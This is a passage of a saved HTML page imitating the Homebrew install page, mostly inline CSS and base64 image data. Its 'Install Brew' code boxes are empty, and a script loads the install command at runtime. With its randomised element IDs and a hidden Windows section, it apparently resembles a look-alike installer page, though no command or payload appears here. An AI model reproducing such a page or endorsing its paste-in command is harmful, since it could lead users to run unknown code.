3f/g4OD/YWBgzAAAABkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1NTSLzNXb/2G79/9SrOT/P5fQ/y+Fv/8wfLH/MHyx/ytnkP+DjJL/+Pj4/+Df3v9Ca4b/yub6/66trPZwcHDScHBw0k9PT7UPDw9AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACxYVFaB8fX//XXaH/112h/+DjJL/nKGk/7CwsP60tLP/vby8//Ly8v///////f7+/4OMkv93f4T/PDs71QEBATEAAAASAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAs7OzuampqZ/s/Ozf/s6+r//f7+////////////////////////////////////////////+Pj4/9jX1v+mpaT/YWBgzAEBATEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQEBMY6Ojun//////////////////////f7+//3+/v////////////3+/v/9/v7////////////////////////////T09P/NTU0iwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAic3Nz3/Ly8v/////////////////T09P/q6uq////////////tLSz/8LCwf/////////////////4+Pj//f7+/8LCwf8pKSl/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWFhZXVVVU49jX1v///////////8LCwf9NTUz/k5OT/5qamf5YWFf/hISD//3+/v//////5eXl/3Nzcv9qamr4QkJCqAAAACIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWFRWgb25u/93d3f/Z2dn/fH1//6alpP+rq6r/pqWk/8XEwv+EhIP/jo6O/6urqv96eXn/kZGP/z8/PrgAAAALAAAAAAAA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" sizes=48x48><style>.sf-hidden{display:none!important}
body{transition:opacity ease-in 0.2s}
.hidden{display:none}h1,h2{font-size:420%;color:#f9d094;margin:0 0 0.1em;text-align:center;text-shadow:1px 1px 10px rgba(0,0,0,0.25)}h2 code{font-size:120%}h1,h2{line-height:1.1}h1{font-weight:900}h1 a,h1 a:hover{font-weight:900;color:#f9d094}h2{font-weight:800;margin-top:0.5em;margin-bottom:0.1em}h2{font-size:300%}#default h2.disabled::before,#default a.disabled::before,#home h2.disabled::before,#home a.disabled::before,#page h2.disabled::before,#page a.disabled::before{content:"⛔";font-family:"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";margin-right:0.3em}#default h2.deprecated::before,#default a.deprecated::before,#home h2.deprecated::before,#home a.deprecated::before,#page h2.deprecated::before,#page a.deprecated::before{content:"⚠";font-family:"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";margin-right:0.3em}#information .row{border-bottom:1px solid rgba(0,0,0,0.5);border-top:1px solid rgba(255,255,255,0.08);padding:2em 20px 0}html{margin:0;padding:0;font-size:62.5%;font-family:"ui-sans-serif","-apple-system","BlinkMacSystemFont","Helvetica Neue","Roboto",sans-serif;height:100%}body{height:100%;font-size:150%;line-height:1.4;color:#f9d094;background:#2e2a24;position:relative;margin:0;padding:0 30px}p{margin:0 0 1em 0}ul{margin-bottom:0.5em}ul{margin-left:20px}div .highlight{margin-top:0}.copyable{display:flex;justify-content:center}.copyable .highlight{overflow-x:auto;margin:0}.copyable .highlight pre{border-top-right-radius:0;-moz-border-top-right-radius:0;-webkit-border-top-right-radius:0;border-bottom-right-radius:0;-moz-border-bottom-right-radius:0;-webkit-border-bottom-right-radius:0;margin:0}.copyable .highlight code::before{display:inline;content:"$ "}.copyable button{background:rgba(0,0,0,0.3);margin:0;border:none;border-left:1px solid #745626;border-top-right-radius:0.4em;-moz-border-top-right-radius:0.4em;-webkit-border-top-right-radius:0.4em;border-bottom-right-radius:0.4em;-moz-border-bottom-right-radius:0.4em;-webkit-border-bottom-right-radius:0.4em}.copyable button:hover{background:#745626}pre{margin:0 0 1em 0;background:rgba(0,0,0,0.3);color:#fff;padding:8px 10px;border-radius:0.4em;-moz-border-radius:0.4em;-webkit-border-radius:0.4em;overflow-x:auto}pre code{font-family:"ui-monospace","SF Mono","Monaco","Menlo","Consolas",monospace;font-size:0.8em;line-height:1.6}a{text-decoration:none;color:#be862d;font-weight:bold}a:focus{outline:1px dotted;color:#d3a459;text-decoration:underline}a:hover{color:#d3a459;text-decoration:underline}a h2:hover,a h3:hover{color:#d3a459;text-decoration:underline}button,select,option{font-size:100%}a,a *,button,button *,select,option,label{cursor:pointer}.group{display:block}.group:after{content:".";display:block;height:0;clear:both;visibility:hidden}button::-moz-focus-inner{border:0;padding:1px}::selection,::-moz-selection{background:#745626}#forkme{width:149px;height:149px;position:absolute;top:0;right:0;border:0}#wrap{width:57em;max-width:100%;margin:0 auto;padding:15px 0 0}#header{text-align:center;margin-bottom:1em}#language{font-size:16px;margin:1em 0}:root{--docsearch-primary-color:#be862d!important;--docsearch-modal-background:#2e2a24!important;--docsearch-footer-background:#2e2a24!important;--docsearch-footer-shadow:0-1px 0 0 rgba(0,0,0,0.5),inset 0 1px 0 0 rgba(255,255,255,0.08)!important;--docsearch-modal-shadow:0 3px 8px 0#2e2a24!important;--docsearch-hit-shadow:none!important;--docsearch-hit-background:rgba(0,0,0,0.3)!important;--docsearch-hit-color:#fff!important;--docsearch-logo-color:#fff!important;--docsearch-container-background:rgba(127,127,127,0.9)!important}#search-container button.DocSearch-Button{display:inline-flex;width:17em;margin:0;border-radius:4px}#information ul{list-style:none;padding:0;margin:0}#information{border-top:1px solid rgba(0,0,0,0.5)}#information .row .col-1{width:49%;float:left;padding:0 0 1em}#information .row .col-2{width:49%;float:right;padding:0 0 1em}#information .credits{border-bottom:none;font-size:0.8em;text-align:center;padding-top:1.8em}#information .credits p{opacity:0.5;margin:0;padding:0 0 0.7em}#information .button a{background:rgba(162,107,20,0.3);padding:8px 10px 6px;border-radius:0.4em;-moz-border-radius:0.4em;-webkit-border-radius:0.4em;box-shadow:0 0 5px rgba(0,0,0,0.4);-moz-box-shadow:0 0 5px rgba(0,0,0,0.4);-webkit-box-shadow:0 0 5px rgba(0,0,0,0.4);font-size:larger}#information .button a:hover{background:rgba(162,107,20,0.25)}.button{text-align:center;margin:1em 0 2em}@media screen and (min-width:700px){#information .highlight{margin-inline-end:0;-moz-margin-end:0;-webkit-margin-end:0}}@media screen and (max-width:700px){body{padding:0}h1{font-size:250%}h2{font-size:150%}ul{margin-left:0;padding:0;padding-left:1em}figure{margin:0}#forkme{width:100px;height:100px}#information .row .col-1{width:100%;padding:0;margin:0}#information .row .col-2{width:100%;float:left}}.c{color:#999988;font-style:italic}.k{font-weight:bold}.o{font-weight:bold}.nb{color:#999999}.nc{color:#999999;font-weight:bold}.no{color:#666666}.nf{color:#999999;font-weight:bold}.nt{color:#008080}.nv,.copyable .highlight code::before{color:#008080}.s2{color:#9c7645}.si{color:#bb8844}
/*! @docsearch/css 3.9.0 | MIT License | © Algolia, Inc. and contributors | https://docsearch.algolia.com */:root{--docsearch-primary-color:#5468ff;--docsearch-text-color:#1c1e21;--docsearch-spacing:12px;--docsearch-icon-stroke-width:1.4;--docsearch-highlight-color:var(--docsearch-primary-color);--docsearch-muted-color:#969faf;--docsearch-container-background:rgba(101,108,133,.8);--docsearch-logo-color:#5468ff;--docsearch-modal-width:560px;--docsearch-modal-height:600px;--docsearch-modal-background:#f5f6f7;--docsearch-modal-shadow:inset 1px 1px 0 0 hsla(0,0%,100%,.5),0 3px 8px 0#555a64;--docsearch-searchbox-height:56px;--docsearch-searchbox-background:#ebedf0;--docsearch-searchbox-focus-background:#fff;--docsearch-searchbox-shadow:inset 0 0 0 2px var(--docsearch-primary-color);--docsearch-hit-height:56px;--docsearch-hit-color:#444950;--docsearch-hit-active-color:#fff;--docsearch-hit-background:#fff;--docsearch-hit-shadow:0 1px 3px 0#d4d9e1;--docsearch-key-gradient:linear-gradient(-225deg,#d5dbe4,#f8f8f8);--docsearch-key-shadow:inset 0-2px 0 0#cdcde6,inset 0 0 1px 1px #fff,0 1px 2px 1px rgba(30,35,90,.4);--docsearch-key-pressed-shadow:inset 0-2px 0 0#cdcde6,inset 0 0 1px 1px #fff,0 1px 1px 0 rgba(30,35,90,.4);--docsearch-footer-height:44px;--docsearch-footer-background:#fff;--docsearch-footer-shadow:0-1px 0 0#e0e3e8,0-3px 6px 0 rgba(69,98,155,.12)}.DocSearch-Button{align-items:center;background:var(--docsearch-searchbox-background);border:0;color:var(--docsearch-muted-color);cursor:pointer;font-weight:500;height:36px;justify-content:space-between;padding:0 8px;user-select:none}.DocSearch-Button:active,.DocSearch-Button:focus,.DocSearch-Button:hover{background:var(--docsearch-searchbox-focus-background);box-shadow:var(--docsearch-searchbox-shadow);color:var(--docsearch-text-color);outline:0}.DocSearch-Button-Container{align-items:center;display:flex}.DocSearch-Search-Icon{stroke-width:1.6}.DocSearch-Button .DocSearch-Search-Icon{color:var(--docsearch-text-color)}.DocSearch-Button-Placeholder{font-size:1rem;padding:0 12px 0 6px}.DocSearch-Button-Keys{display:flex;min-width:calc(40px + .8em)}.DocSearch-Button-Key{align-items:center;background:var(--docsearch-key-gradient);border:0;border-radius:3px;box-shadow:var(--docsearch-key-shadow);color:var(--docsearch-muted-color);display:flex;height:18px;justify-content:center;margin-right:.4em;padding:0 0 2px;position:relative;top:-1px;transition-duration:.1s;transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);width:20px}@media (prefers-reduced-motion){.DocSearch-Button-Key{transition:none}}@media (max-width:768px){.DocSearch-Button-Keys,.DocSearch-Button-Placeholder{display:none}}.DocSearch-Input::placeholder{color:var(--docsearch-muted-color);opacity:1}.DocSearch-Input::-webkit-search-cancel-button,.DocSearch-Input::-webkit-search-decoration,.DocSearch-Input::-webkit-search-results-button,.DocSearch-Input::-webkit-search-results-decoration{display:none}.DocSearch-Reset:hover{color:var(--docsearch-highlight-color)}.DocSearch-Dropdown::-webkit-scrollbar{width:12px}.DocSearch-Dropdown::-webkit-scrollbar-track{background:0 0}.DocSearch-Dropdown::-webkit-scrollbar-thumb{background-color:var(--docsearch-muted-color);border:3px solid var(--docsearch-modal-background);border-radius:20px}.DocSearch-Hit-action-button:focus,.DocSearch-Hit-action-button:hover{background:rgba(0,0,0,.2);transition:background-color .1s ease-in}@media screen and (prefers-reduced-motion:reduce){.DocSearch-Hit-action-button:focus,.DocSearch-Hit-action-button:hover{transition:none}}.DocSearch-Hit-action-button:focus path,.DocSearch-Hit-action-button:hover path{fill:#fff}@media screen and (prefers-reduced-motion:reduce){.DocSearch-Hit-action-button:focus,.DocSearch-Hit-action-button:hover{background:rgba(0,0,0,.2);transition:none}}.DocSearch-Prefill:focus,.DocSearch-Prefill:hover{outline:0;text-decoration:underline}@media (max-width:768px){:root{--docsearch-spacing:10px;--docsearch-footer-height:40px}}@keyframes fade-in{0%{opacity:0}to{opacity:1}}
@keyframes slide-in-one-tap{from{transform:translateY(80px)}to{transform:translateY(0px)}} .install-steps{max-width:42em;margin:0 auto;padding:0 10px 1em;} .install-step{display:flex;align-items:flex-start;margin-bottom:1.2em;} .install-step:last-child{margin-bottom:0;} .install-num{flex-shrink:0;width:2em;height:2em;border-radius:50%; background:rgba(162,107,20,0.35);color:#f9d094; display:flex;align-items:center;justify-content:center; font-weight:bold;font-size:.95em;margin-right:.85em;line-height:1; box-shadow:0 0 5px rgba(0,0,0,0.3);} .install-body{flex:1;} .install-step-title{font-weight:bold;color:#f9d094;margin:0 0 .2em; font-size:1em;line-height:1.3;} .install-step-desc{color:#f9d094;opacity:.9;font-size:.9em; line-height:1.5;margin:0;} .install-kbd{display:inline-block;background:rgba(0,0,0,0.35); border:1px solid rgba(255,255,255,0.12);border-radius:4px; padding:.05em .45em;font-size:.88em; font-family:"ui-monospace","SF Mono","Monaco","Menlo","Consolas",monospace; color:#fff;white-space:nowrap;line-height:1.4;} .install-note{max-width:42em;margin:1em auto 0;text-align:center; font-size:.82em;color:#f9d094;opacity:.6;} .install-steps{max-width:42em;margin:0 auto;padding:0 10px 1em;}
.install-step{display:flex;align-items:flex-start;margin-bottom:1.2em;}
.install-num{flex-shrink:0;width:2em;height:2em;border-radius:50%;background:rgba(162,107,20,0.35);color:#f9d094;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:.95em;margin-right:.85em;line-height:1;box-shadow:0 0 5px rgba(0,0,0,0.3);}
.install-body{flex:1;}
.install-step-title{font-weight:bold;color:#f9d094;margin:0 0 .2em;font-size:1em;line-height:1.3;}
.install-step-desc{color:#f9d094;opacity:.9;font-size:.9em;line-height:1.5;margin:0;}
.install-kbd{display:inline-block;background:rgba(0,0,0,0.35);border:1px solid rgba(255,255,255,0.12);border-radius:4px;padding:.05em .45em;font-size:.88em;font-family:monospace;color:#fff;white-space:nowrap;line-height:1.4;} </style></head><body style="height:100%;font-size:150%;line-height:1.4;color:#f9d094;background:#2e2a24;position:relative;margin:0;padding:0 30px;font-family:ui-sans-serif,-apple-system,BlinkMacSystemFont,Helvetica Neue,Roboto,sans-serif"><script> window.INSTALL_COMMAND = 'Loading...';
</script><div id=wrap style="width:57em;max-width:100%;margin:0 auto;padding:15px 0 0"><header id=header style="text-align:center;margin-bottom:1em"><img alt="Brew logo" src=data:image/svg+xml;base64,PHN2ZyBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGZpbGwtcnVsZT0iZXZlbm9kZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgdmlld0JveD0iMCAwIDE4MCAyNzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgc3Ryb2tlPSIjMDAwIiBzdHJva2Utd2lkdGg9IjQuNzkiPjxwYXRoIGQ9Im03NC41NCA1MC4zM2MuNzQtMjMuNDg3LTcuMTcyLTM3LjMzNC0yOS45MTctNDYuNDgxLTYuNDY1IDIyLjYxNCAyMC4yMjUgNDMuNDY1IDI5LjkxNyA0Ni40ODF6IiBmaWxsPSIjZDFkM2Q0Ii8+PHBhdGggZD0ibTEzNi4yMjMgOTAuMTM0Yy43NC0xOS4yODYtNC4xMzEtMjcuMDctNy43ODctMzIuNjM2LTMuNzA5LTUuMTkyLTEyLjYwOS0xMy4zNTItMjMuNTQ0LTEzLjY5NC0xMC4zNDEtLjMyNC0xMi44MjggNS4zOTItMjIuMzY4IDUuNzM3LTEuNTY0LTE3LjM3MiAxMS41NDctMjYuOTA1IDExLjU0Ny0yNi45MDVzLTMuNTg1LTUuMDY3LTYuNTUxLTYuMzA1Yy00LjI2NiAzLjc5MS0xNi4wMDggMTYuNDM2LTEzLjI5MSAzMi43MDgtOC43NzgtMS42NzgtMTQuOTc0LTYuNzAyLTI0LjE5NS00Ljg4OC0xMi41NjIgMi40NzItMjIuOTE3IDEwLjA2Ny0yOC44MTkgMjYuNzMzLTUuOTAxIDE2LjY2NyAyLjA4MyAzNi4xMTEgMy44MTkgNDEuNjY0IDEuNzM3IDUuNTU4IDE0LjU4NCAyOS4xNjQgMjQuNjUzIDMyLjYzOCAxMC4wNjcgMy40NzUgMTAuMDcgMS45MDkgMTUuNDUyLS4xNzMgNS4zODMtMi4wODMgMTMuNTQtNS45MDIgMjUuNTIyLTEuNTYxIDExLjk3NSA0LjMzOSAxMy41MzcgNS4zNzkgMjEgLjUxOSA3LjQ2OS00Ljg1OSAxNy4xODgtMTkuOTYyIDE5LjQ0My0yNC4zMDMgMi4yNTctNC4zMzkgMy40NzMtNi41OTcgNC4xNy04Ljg1MyA3LjI1Ni0zLjYyMS4yODMtMy4zOTcuOTQ5LTIwLjY4MXoiIGZpbGw9IiNkMWQzZDQiLz48cGF0aCBkPSJtMTU1LjcxNCAyMzEuMDg0YTE4IDE4IDAgMCAwIDE4LjA2NC0xNy45OThjLjAwMi0xOC4yNzMuMDAyLTQ2LjUxLjAwMi02NC44MzNhMTggMTggMCAwIDAgLTE4LTE4aC0xNC44MzhhNCA0IDAgMCAxIC00LTR2LTkuNDNoLTExNy4wM2wuMjk1IDEzOC4yMTNhNC4wMDEgNC4wMDEgMCAwIDAgMS44NSAzLjM2NWM1LjIxMiAzLjAxOCAyMS45MjEgOC43NSA1Ny4wMDQgOC43NSAzNS44MjUgMCA1MS44MzktNy42NzQgNTYuNDI0LTExLjEzOWEzLjk3OSAzLjk3OSAwIDAgMCAxLjQzOC0zLjA2MmMuMDE5LTMuODI1LjAxOS0xMi42ODguMDE5LTE3LjkyNGEzLjk5OSAzLjk5OSAwIDAgMSA0LjA4My0zLjk5OWM0LjQwMS4wNjIgOS42NzQuMDcxIDE0LjY4OS4wNTd6bS0xOC43NzItNzkuODA2YzAtMS4zMjYuNTI3LTIuNTk4IDEuNDY0LTMuNTM2YTUuMDA0IDUuMDA0IDAgMCAxIDMuNTM2LTEuNDY0aDEyLjczOGMxLjMyNiAwIDIuNTk4LjUyNyAzLjUzNiAxLjQ2NGE1LjAwNCA1LjAwNCAwIDAgMSAxLjQ2NCAzLjUzNnY1OC4xODVhNS4wMDQgNS4wMDQgMCAwIDEgLTEuNDY0IDMuNTM2IDUuMDA0IDUuMDA0IDAgMCAxIC0zLjUzNiAxLjQ2NGgtMTIuNzM4YTUuMDA0IDUuMDA0IDAgMCAxIC0zLjUzNi0xLjQ2NCA1LjAwNCA1LjAwNCAwIDAgMSAtMS40NjQtMy41MzZ6IiBmaWxsPSIjZmZmIiBmaWxsLXJ1bGU9Im5vbnplcm8iLz48L2c+PHBhdGggZD0ibTMxLjQ0OSAxMTUuNjYzdjEyMy45ODZjMCAxLjQzMS43NjQgMi43NTMgMi4wMDMgMy40NjcgNS4wNjEgMi40MTIgMTkuNzQzIDguMTY5IDQ1LjQ4NCA4LjE2OSAyNS45MTIgMCA0MC4xNTgtNi45OTUgNDQuOTI4LTkuODc4YTMuOTg3IDMuOTg3IDAgMCAwIDEuODI3LTMuMzUxYy4wMTEtMTYuNDQxLjAxMS0xMjIuMzkzLjAxMS0xMjIuMzkzeiIgZmlsbD0iI2ZiYjA0MCIvPjxwYXRoIGQ9Im0zNS41MjEuMjQ5djExMi44MTYiIGZpbGw9Im5vbmUiIHN0cm9rZT0iI2ZmZGI5NiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49Im1pdGVyIiBzdHJva2Utd2lkdGg9IjExLjk2IiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAuODQ5MzEgOS43ODIgMTM2LjQ1MikiLz48cGF0aCBkPSJtOTguNTU1IDE0MS4xMDZjMC0yLTEuMTc3LTQuMzg4LTMuMTEtNS41ODdhMTYuNzM0IDE2LjczNCAwIDAgMSAtNi45NDItOC4zYy0yNS41OTEuODYxLTQ4Ljk0OS0zLjYzMy02MC43MTYtNi44MDZhOTguMjE4IDk4LjIxOCAwIDAgMCAtOS4xNzEtMi4xM2MtNy4wNDMtMS4zOTctMTIuMzk2LTcuNTgyLTEyLjM5Ni0xNS4wMTggMC04LjE4NSA2LjQ5NC0xNC44MzYgMTQuNjA4LTE1LjEyNyAxLjU2NS04LjY1NyA5LjEyMS0xNS4yMjkgMTguMjI5LTE1LjIyOSAxMC4yNDIgMCAxOC41NDQgOC4zMDQgMTguNTQ0IDE4LjU0NSAwIDIuMTU1LS4zODkgNC4yMTgtMS4wNjQgNi4xNDRsLjA1NS4wMDljMi4yODctNy4xNTMgOC45ODMtMTIuMzM2IDE2Ljg5Ni0xMi4zMzYgNy44NjIgMCAxNC41MjIgNS4xMjIgMTYuODQ4IDEyLjIwOGExOC42NzMgMTguNjczIDAgMCAxIC0uMTAxLTEuOTQ3YzAtMTAuNjUyIDguNjM0LTE5LjI4NiAxOS4yODQtMTkuMjg2IDguNjIyIDAgMTUuOTE5IDUuNjU5IDE4LjM4OCAxMy40NjJsMS42ODEtLjQzOGExNS4wODMgMTUuMDgzIDAgMCAxIDcuNDMyLTEuOTU1YzguMzY5IDAgMTUuMTU0IDYuNzg1IDE1LjE1MSAxNS4xNTIgMCA3LjY2Ni01LjY5MSAxNC4wMDEtMTMuMDc5IDE1LjAxMmEyMi4zMzkgMjIuMzM5IDAgMCAwIC00Ljg5MSAxLjI3Yy00LjM5MSAxLjY1NS04Ljg4MSAzLjAyNy0xMy40MTcgNC4xNTlhMTYuNjYgMTYuNjYgMCAwIDEgLTEuOTA5IDYuMjMxIDIwLjcyMyAyMC43MjMgMCAwIDAgLTIuMzggMTEuMjU3Yy0uMDAyLjIzNi4wMDcgMS40NzIuMDA3IDEuNzEgMCA0Ljk1Ni00LjAxNiA3Ljk3Mi04Ljk3NiA3Ljk3MmE4Ljk3MSA4Ljk3MSAwIDAgMSAtOC45NzEtOC45NzJ6IiBmaWxsPSIjZmZmIiBzdHJva2U9IiMwMDAiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSI0Ljc5Ii8+PC9zdmc+ width=128 height=128><h1 style="font-size:420%;color:#f9d094;margin:0 0 0.1em;text-align:center;text-shadow:1px 1px 10px rgba(0,0,0,0.25);font-weight:900;line-height:1.1">Brew</h1><p id=subtitle style="margin:0 0 1em 0;text-align:center"><strong>The Missing Package Manager for macOS (or Linux)</strong></p></header><main><div id=information style="border-top:1px solid rgba(0,0,0,0.5)"><ul><li><section class="group row"><div id="f82qxj"><h2 id=install style="font-size:300%;color:#f9d094;margin-top:0.5em;margin-bottom:0.1em;font-weight:800;text-align:center;text-shadow:1px 1px 10px rgba(0,0,0,0.25);line-height:1.1">Install Brew</h2><br><div class=copyable style="display:flex;justify-content:center"><figure class=highlight><pre style="margin:0 0 1em 0;background:rgba(0,0,0,0.3);color:#fff;padding:8px 10px;border-radius:0.4em;overflow-x:auto"><code id="n3ZmGLoC4" class="language-bash" data-lang="bash" style="font-family:ui-monospace,SF Mono,Monaco,Menlo,Consolas,monospace;font-size:0.8em;line-height:1.6"></code></pre></figure><button id="lOdECy46u" aria-label="Copy to clipboard" style="background:rgba(0,0,0,0.3);margin:0;border:none;border-left:1px solid #745626;border-top-right-radius:0.4em;border-bottom-right-radius:0.4em;cursor:pointer;padding:8px 12px;font-size:100%">📋</button></div><br><br><div class=col-1 style="width:49%;float:left;padding:0 0 1em"><p>Paste that in a macOS Terminal or Linux shell prompt.</p></div><div class=col-2 style="width:49%;float:right;padding:0 0 1em"><p>The script explains what it will do and then pauses before it does it.</p></div></div></section></li><li class="gMeODKz8Y" style="display:none"><section class="group row"><h2 id=install-win style="font-size:300%;color:#f9d094;margin-top:0.5em;margin-bottom:0.1em;font-weight:800;text-align:center;text-shadow:1px 1px 10px rgba(0,0,0,0.25);line-height:1.1">Install Brew</h2><br><div class=copyable style="display:flex;justify-content:center"><figure class=highlight><pre style="margin:0 0 1em 0;background:rgba(0,0,0,0.3);color:#fff;padding:8px 10px;border-radius:0.4em;overflow-x:auto"><code id="h3Ym8_4u" class="language-bash" data-lang="bash" style="font-family:ui-monospace,SF Mono,Monaco,Menlo,Consolas,monospace;font-size:0.8em;line-height:1.6"></code></pre></figure><button id="os4l7a2G" aria-label="Copy to clipboard" style="background:rgba(0,0,0,0.3);margin:0;border:none;border-left:1px solid 